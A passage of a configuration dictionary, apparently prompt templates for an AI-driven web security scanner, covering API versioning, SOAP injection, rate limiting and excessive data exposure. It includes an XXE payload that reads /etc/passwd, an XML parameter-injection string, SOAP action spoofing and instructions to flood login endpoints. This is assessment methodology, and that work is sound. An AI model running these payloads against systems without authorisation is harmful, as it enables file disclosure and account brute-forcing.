        "verification_criteria": "CONFIRMED if: older API version accessible with weaker security controls (missing auth, no rate limit, exposed sensitive endpoints removed in newer version).",
        "exploitation_guidance": "Document: old vs new API version differences, missing security controls in old version, and exploitable endpoints.",
        "false_positive_indicators": "Old versions properly deprecated/removed. Same security controls on all versions. Version routing not supported.",
        "technology_hints": {"general": "Check: URL path versioning, header versioning (Accept: application/vnd.api.v1), query param (?version=1)"}
    },

    "soap_injection": {
        "role": "You are a SOAP/XML web service injection specialist.",
        "detection_strategy": "Inject XML/SOAP payloads into web service parameters to manipulate SOAP queries or exploit XML parsers.",
        "test_methodology": "1. Find SOAP endpoints (WSDL files, .asmx, .svc). 2. Inject XML entities in SOAP parameters. 3. Test for XXE within SOAP envelope. 4. Try SOAP action spoofing. 5. Test parameter manipulation within XML structure.",
        "payload_selection": "WSDL discovery: ?wsdl. XXE in SOAP: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>. SOAP action override via SOAPAction header. Parameter injection: </param><injected>data</injected><param>",
        "verification_criteria": "CONFIRMED if: SOAP parameter injection changes service behavior, OR XXE in SOAP body extracts files, OR SOAP action spoofing accesses restricted operations.",
        "exploitation_guidance": "Document: WSDL exposure, injection technique, and data extracted or operation performed.",
        "false_positive_indicators": "SOAP parameters properly escaped. XML parser disables entities. WSDL intentionally public. SOAP action validated.",
        "technology_hints": {"java": "Apache Axis, Apache CXF SOAP services", "dotnet": "WCF, ASMX web services", "general": "Check for .wsdl, .asmx, .svc endpoints"}
    },

    "api_rate_limiting": {
        "role": "You are an API rate limiting assessment specialist.",
        "detection_strategy": "Test API endpoints for missing or inadequate rate limiting that could allow abuse, scraping, or denial of service.",
        "test_methodology": "1. Send 100 rapid requests to key API endpoints. 2. Check for: HTTP 429, X-RateLimit-* headers, Retry-After. 3. Test different endpoints (some may lack limits). 4. Test authenticated vs unauthenticated limits. 5. Check if limits apply per-IP, per-user, per-API-key.",
        "payload_selection": "100 rapid requests to: login endpoint, data retrieval, search, password reset, registration. Check headers: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset.",
        "verification_criteria": "CONFIRMED if: 100+ requests accepted without rate limiting on security-critical endpoints (login, registration, password reset, data export).",
        "exploitation_guidance": "Document: endpoint, requests per minute allowed, and impact (brute force feasibility, data scraping, DoS potential).",
        "false_positive_indicators": "Rate limiting present but generous (1000/min). Rate limiting on proxy/CDN level. Endpoint is non-sensitive (public data).",
        "technology_hints": {"general": "Check: express-rate-limit, Django Ratelimit, Spring Bucket4j, API Gateway throttling, CloudFlare rate limiting"}
    },

    "excessive_data_exposure": {
        "role": "You are an excessive data exposure specialist targeting API responses.",
        "detection_strategy": "Check if APIs return more data than needed by the client, exposing sensitive fields that should be filtered server-side.",
        "test_methodology": "1. Call API endpoints and analyze response fields. 2. Check for: password hashes, tokens, internal IDs, PII not needed by client. 3. Compare admin vs user API responses. 4. Check GraphQL for over-fetching. 5. Test if filtering is client-side only.",
        "payload_selection": "GET /api/users (check all fields returned). GET /api/profile (check for extra fields). GraphQL: query without field selection. Check: hidden input fields in HTML.",
        "verification_criteria": "CONFIRMED if: API returns sensitive data fields (password hash, internal IDs, other users' PII, tokens) not required by the client UI.",
        "exploitation_guidance": "Document: endpoint, sensitive fields returned, and data that should not be exposed. Compare UI display vs API response.",
        "false_positive_indicators": "Fields are needed by client. Data is non-sensitive. User viewing their own data (intended). Response filtered by role.",
        "technology_hints": {"general": "OWASP API Security #3. Check: REST APIs without field selection, GraphQL without proper field-level authorization, response serializers including all model fields."}
    },
}
